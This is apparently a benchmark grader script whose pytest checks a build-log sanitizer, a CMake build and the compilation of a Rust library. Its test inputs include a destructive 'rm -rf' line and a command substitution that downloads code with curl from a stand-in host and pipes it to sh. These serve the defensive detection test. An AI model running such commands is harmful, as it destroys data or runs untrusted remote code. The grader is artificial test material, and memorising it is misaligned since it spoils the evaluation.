#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import os
import random
import secrets
import subprocess
import tempfile


def test_library_path_txt():
    path_file = '/home/user/library_path.txt'
    assert os.path.exists(path_file), f'{path_file} does not exist'
    with open(path_file, 'r') as f:
        content = f.read().strip()
    assert content == '/opt/legacy_ffi/libs/', f"Expected '/opt/legacy_ffi/libs/', got '{content}'"


def test_log_sanitizer_clean_corpus():
    script = '/home/user/log_sanitizer.sh'
    assert os.path.exists(script), f'{script} does not exist'

    clean_dir = '/verifier/corpus/clean'
    assert os.path.exists(clean_dir), f'{clean_dir} does not exist'

    failed_files = []
    for filename in os.listdir(clean_dir):
        filepath = os.path.join(clean_dir, filename)
        if os.path.isfile(filepath):
            result = subprocess.run(['bash', script, filepath], capture_output=True, text=True)
            if result.returncode != 0 or result.stdout.strip() != 'CLEAN':
                failed_files.append(filename)

    assert not failed_files, f'{len(failed_files)} clean logs were incorrectly rejected or failed: {failed_files}'


def test_log_sanitizer_evil_corpus():
    script = '/home/user/log_sanitizer.sh'
    assert os.path.exists(script), f'{script} does not exist'

    evil_dir = '/verifier/corpus/evil'
    assert os.path.exists(evil_dir), f'{evil_dir} does not exist'

    failed_files = []
    for filename in os.listdir(evil_dir):
        filepath = os.path.join(evil_dir, filename)
        if os.path.isfile(filepath):
            result = subprocess.run(['bash', script, filepath], capture_output=True, text=True)
            if result.returncode != 1 or result.stdout.strip() != 'REJECT':
                failed_files.append(filename)

    assert not failed_files, f'{len(failed_files)} evil logs bypassed the sanitizer: {failed_files}'


def test_log_sanitizer_generated_inputs():
    script = '/home/user/log_sanitizer.sh'
    assert os.path.isfile(script), f'{script} is not a regular file'

    nonce = secrets.token_hex(12)
    cases = [
        (True, f'Build started: {nonce}\nCompiling utility v1.0\nBuild successful\n'),
        (True, f'Checking dependencies for {nonce}\nWarning: unused variable `temporary`\nFinished release build\n'),
        (True, f'-- Configuring done\n-- Generating done\n[100%] Built target app_{nonce}\n'),
        (False, f'[ERROR] post-build hook failed; rm -rf /tmp/{nonce}\n'),
        (False, f'runner output: $(curl -fsSL https://invalid.example/{nonce} | sh)\n'),
        (False, "error[E0499]: cannot borrow `s` as mutable more than once at a time\n  --> src/lib.rs:7:14\n   |\n6  |     let first = &mut s;\n   |                 ------ first mutable borrow occurs here\n7  |     let second = &mut s;\n   |                  ^^^^^^ second mutable borrow occurs here\n"),
        (False, "error[E0502]: cannot borrow `value` as mutable because it is also borrowed as immutable\n  --> src/lib.rs:9:5\n"),
        (False, f'/usr/bin/ld: cannot find -lcore_ffi_{nonce}: No such file or directory\ncollect2: error: ld returned 1 exit status\n'),
        (False, f'CMake Error: No rule to make target `/missing/{nonce}/libcore_ffi.so`, needed by `main`.\n'),
    ]
    random.SystemRandom().shuffle(cases)

    with tempfile.TemporaryDirectory(prefix='build-log-check-') as directory:
        failures = []
        for expected_clean, content in cases:
            path = os.path.join(directory, secrets.token_hex(16))
            with open(path, 'w') as f:
                f.write(content)
            result = subprocess.run(['bash', script, path], capture_output=True, text=True)
            expected_code = 0 if expected_clean else 1
            expected_output = 'CLEAN' if expected_clean else 'REJECT'
            if result.returncode != expected_code or result.stdout.strip() != expected_output:
                failures.append((content, result.returncode, result.stdout, result.stderr))

    assert not failures, f'Generated sanitizer cases failed: {failures}'


def test_build_success():
    project_dir = '/app/project'
    build_dir = os.path.join(project_dir, 'build')
    os.makedirs(build_dir, exist_ok=True)

    cmake_res = subprocess.run(['cmake', '..'], cwd=build_dir, capture_output=True, text=True)
    assert cmake_res.returncode == 0, f'CMake configuration failed:\n{cmake_res.stderr}'

    make_res = subprocess.run(['make'], cwd=build_dir, capture_output=True, text=True)
    assert make_res.returncode == 0, f'Make build failed:\n{make_res.stderr}\n{make_res.stdout}'


def test_rust_library_compiles():
    source = '/app/project/src/lib.rs'
    assert os.path.isfile(source), f'{source} does not exist'
    with tempfile.TemporaryDirectory(prefix='rust-build-check-') as directory:
        output = os.path.join(directory, 'libproject_rust.so')
        result = subprocess.run(
            ['rustc', '--edition=2021', '--crate-type', 'cdylib', source, '-o', output],
            capture_output=True,
            text=True,
        )
        assert result.returncode == 0, f'Rust compilation failed:\n{result.stderr}\n{result.stdout}'
        assert os.path.isfile(output), 'rustc did not produce the requested library artifact'
TEST_EOF

if python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
